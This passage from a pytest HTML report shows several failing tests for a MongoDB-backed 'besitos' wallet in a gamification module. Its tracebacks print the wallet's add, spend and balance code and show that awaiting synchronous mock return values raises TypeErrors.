&#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_spend_besitos_insufficient_funds</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d170150fd40&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 150, reason = &#x27;Item purchase&#x27;<br/>item_id = None, reference_id = None, metadata = {}<br/><br/>    async def spend_besitos(self, user_id: str, amount: int, reason: str,<br/>                           item_id: Optional[str] = None, reference_id: Optional[str] = None,<br/>                           metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Spend besitos from user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.2: WHEN besitos are spent THEN the system<br/>        SHALL validate balance and publish besitos_spent events.<br/>    <br/>        Args:<br/>            user_id: User ID to spend besitos from<br/>            amount: Amount of besitos to spend (must be positive)<br/>            reason: Reason for spending besitos<br/>            item_id: Optional item ID if spending on an item<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            InsufficientFundsError: If user doesn&#x27;t have enough besitos<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Spending %d besitos from user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance and validate<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:237: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f56d0&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d170150fd40&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537738457792&#x27;&gt;<br/>mock_session = &lt;Mock name=&#x27;mock._db.client.start_session().__aenter__()&#x27; id=&#x27;137537759797200&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_spend_besitos_insufficient_funds(self, besitos_wallet, mock_mongodb_handler, mock_session):<br/>        &quot;&quot;&quot;Test spending besitos when user has insufficient balance.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        amount = 150  # More than available balance<br/>        reason = &quot;Item purchase&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>    <br/>        # Mock user document with insufficient balance<br/>        mock_users_collection.find_one.return_value = {&quot;besitos_balance&quot;: 100}<br/>    <br/>        # Mock session context manager<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__.return_value = mock_session<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>    <br/>        # Act &amp; Assert<br/>        with pytest.raises(InsufficientFundsError):<br/>&gt;           await besitos_wallet.spend_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:223: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d170150fd40&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 150, reason = &#x27;Item purchase&#x27;<br/>item_id = None, reference_id = None, metadata = {}<br/><br/>    async def spend_besitos(self, user_id: str, amount: int, reason: str,<br/>                           item_id: Optional[str] = None, reference_id: Optional[str] = None,<br/>                           metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Spend besitos from user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.2: WHEN besitos are spent THEN the system<br/>        SHALL validate balance and publish besitos_spent events.<br/>    <br/>        Args:<br/>            user_id: User ID to spend besitos from<br/>            amount: Amount of besitos to spend (must be positive)<br/>            reason: Reason for spending besitos<br/>            item_id: Optional item ID if spending on an item<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            InsufficientFundsError: If user doesn&#x27;t have enough besitos<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Spending %d besitos from user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance and validate<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/>    <br/>                    if not user_doc:<br/>                        logger.warning(&quot;User %s not found for spending transaction&quot;, user_id)<br/>                        raise InsufficientFundsError(f&quot;User {user_id} not found&quot;)<br/>    <br/>                    balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    # Validate balance (requirement 2.2)<br/>                    if balance_before &lt; amount:<br/>                        logger.warning(&quot;Insufficient funds for user %s: has %d, needs %d&quot;,<br/>                                     user_id, balance_before, amount)<br/>                        raise InsufficientFundsError(<br/>                            f&quot;Insufficient funds: has {balance_before}, needs {amount}&quot;<br/>                        )<br/>    <br/>                    balance_after = balance_before - amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.SPENT,<br/>                        amount=-amount,  # Negative for spending<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=&quot;spending&quot;,<br/>                        reference_id=reference_id or item_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=-amount,  # Negative for spending<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully spent %d besitos from user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_spent event (requirement 2.2)<br/>                await self._publish_besitos_spent_event(<br/>                    user_id, transaction_id, amount, reason, item_id, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except InsufficientFundsError:<br/>                # Re-raise insufficient funds error without wrapping<br/>                raise<br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error spending besitos for user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to spend besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error spending besitos for user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:320: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:319 Unexpected error spending besitos for user test_user_123: object dict can&#x27;t be used in &#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_spend_besitos_user_not_found</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8ea7590&gt;<br/>user_id = &#x27;nonexistent_user&#x27;, amount = 50, reason = &#x27;Item purchase&#x27;<br/>item_id = None, reference_id = None, metadata = {}<br/><br/>    async def spend_besitos(self, user_id: str, amount: int, reason: str,<br/>                           item_id: Optional[str] = None, reference_id: Optional[str] = None,<br/>                           metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Spend besitos from user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.2: WHEN besitos are spent THEN the system<br/>        SHALL validate balance and publish besitos_spent events.<br/>    <br/>        Args:<br/>            user_id: User ID to spend besitos from<br/>            amount: Amount of besitos to spend (must be positive)<br/>            reason: Reason for spending besitos<br/>            item_id: Optional item ID if spending on an item<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            InsufficientFundsError: If user doesn&#x27;t have enough besitos<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Spending %d besitos from user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance and validate<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object NoneType can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:237: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f5880&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8ea7590&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537748382544&#x27;&gt;<br/>mock_session = &lt;Mock name=&#x27;mock._db.client.start_session().__aenter__()&#x27; id=&#x27;137537618870096&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_spend_besitos_user_not_found(self, besitos_wallet, mock_mongodb_handler, mock_session):<br/>        &quot;&quot;&quot;Test spending besitos for non-existent user.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;nonexistent_user&quot;<br/>        amount = 50<br/>        reason = &quot;Item purchase&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>    <br/>        # Mock user document not found<br/>        mock_users_collection.find_one.return_value = None<br/>    <br/>        # Mock session context manager<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__.return_value = mock_session<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>    <br/>        # Act &amp; Assert<br/>        with pytest.raises(InsufficientFundsError):<br/>&gt;           await besitos_wallet.spend_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:243: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8ea7590&gt;<br/>user_id = &#x27;nonexistent_user&#x27;, amount = 50, reason = &#x27;Item purchase&#x27;<br/>item_id = None, reference_id = None, metadata = {}<br/><br/>    async def spend_besitos(self, user_id: str, amount: int, reason: str,<br/>                           item_id: Optional[str] = None, reference_id: Optional[str] = None,<br/>                           metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Spend besitos from user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.2: WHEN besitos are spent THEN the system<br/>        SHALL validate balance and publish besitos_spent events.<br/>    <br/>        Args:<br/>            user_id: User ID to spend besitos from<br/>            amount: Amount of besitos to spend (must be positive)<br/>            reason: Reason for spending besitos<br/>            item_id: Optional item ID if spending on an item<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            InsufficientFundsError: If user doesn&#x27;t have enough besitos<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Spending %d besitos from user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance and validate<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/>    <br/>                    if not user_doc:<br/>                        logger.warning(&quot;User %s not found for spending transaction&quot;, user_id)<br/>                        raise InsufficientFundsError(f&quot;User {user_id} not found&quot;)<br/>    <br/>                    balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    # Validate balance (requirement 2.2)<br/>                    if balance_before &lt; amount:<br/>                        logger.warning(&quot;Insufficient funds for user %s: has %d, needs %d&quot;,<br/>                                     user_id, balance_before, amount)<br/>                        raise InsufficientFundsError(<br/>                            f&quot;Insufficient funds: has {balance_before}, needs {amount}&quot;<br/>                        )<br/>    <br/>                    balance_after = balance_before - amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.SPENT,<br/>                        amount=-amount,  # Negative for spending<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=&quot;spending&quot;,<br/>                        reference_id=reference_id or item_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=-amount,  # Negative for spending<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully spent %d besitos from user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_spent event (requirement 2.2)<br/>                await self._publish_besitos_spent_event(<br/>                    user_id, transaction_id, amount, reason, item_id, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except InsufficientFundsError:<br/>                # Re-raise insufficient funds error without wrapping<br/>                raise<br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error spending besitos for user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to spend besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error spending besitos for user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object NoneType can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:320: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:319 Unexpected error spending besitos for user nonexistent_user: object NoneType can&#x27;t be used in &#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_atomic_transaction_handling</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d1700a29520&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 100, reason = &#x27;Atomic test&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:113: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f5bb0&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d1700a29520&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537748384656&#x27;&gt;<br/>mock_session = &lt;Mock id=&#x27;137537748374624&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_atomic_transaction_handling(self, besitos_wallet, mock_mongodb_handler, mock_session):<br/>        &quot;&quot;&quot;Test that operations use atomic transactions.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        amount = 100<br/>        reason = &quot;Atomic test&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>    <br/>        # Mock user document<br/>        mock_users_collection.find_one.return_value = {&quot;besitos_balance&quot;: 50}<br/>    <br/>        # Mock session context manager correctly<br/>        mock_mongodb_handler._db.client.start_session.return_value = AsyncMock()<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__ = AsyncMock(return_value=mock_session)<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>        mock_session.__aexit__ = AsyncMock()<br/>    <br/>        # Act<br/>&gt;       result = await besitos_wallet.add_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:277: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d1700a29520&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 100, reason = &#x27;Atomic test&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/>    <br/>                    if not user_doc:<br/>                        # Create user if doesn&#x27;t exist<br/>                        balance_before = 0<br/>                        await self.users_collection.update_one(<br/>                            {&quot;user_id&quot;: user_id},<br/>                            {<br/>                                &quot;$setOnInsert&quot;: {<br/>                                    &quot;user_id&quot;: user_id,<br/>                                    &quot;besitos_balance&quot;: 0,<br/>                                    &quot;created_at&quot;: datetime.utcnow(),<br/>                                    &quot;updated_at&quot;: datetime.utcnow()<br/>                                }<br/>                            },<br/>                            upsert=True,<br/>                            session=session<br/>                        )<br/>                    else:<br/>                        balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    balance_after = balance_before + amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.AWARDED,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=source,<br/>                        reference_id=reference_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully added %d besitos to user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_added event (requirement 2.1)<br/>                await self._publish_besitos_added_event(<br/>                    user_id, transaction_id, amount, reason, source, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to add besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:198: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:197 Unexpected error adding besitos to user test_user_123: object dict can&#x27;t be used in &#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_get_balance_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016db9b0&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8cf0aa0&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537616798608&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_get_balance_success(self, besitos_wallet, mock_mongodb_handler):<br/>        &quot;&quot;&quot;Test successful retrieval of user balance.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>    <br/>        # Mock user document with balance<br/>        mock_users_collection.find_one.return_value = {&quot;besitos_balance&quot;: 250}<br/>    <br/>        # Act<br/>&gt;       balance = await besitos_wallet.get_balance(user_id)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:295: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8cf0aa0&gt;<br/>user_id = &#x27;test_user_123&#x27;<br/><br/>    async def get_balance(self, user_id: str) -&gt; int:<br/>        &quot;&quot;&quot;Get user&#x27;s current besitos balance.<br/>    <br/>        Args:<br/>            user_id: User ID to get balance for<br/>    <br/>        Returns:<br/>            int: Current besitos balance<br/>        &quot;&quot;&quot;<br/>        logger.debug(&quot;Getting balance for user %s&quot;, user_id)<br/>    <br/>        try:<br/>&gt;           user_doc = await self.users_collection.find_one(<br/>                {&quot;user_id&quot;: user_id},<br/>                {&quot;besitos_balance&quot;: 1}<br/>            )<br/><span class="error">E           TypeError: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:334: TypeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_get_balance_user_not_found</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
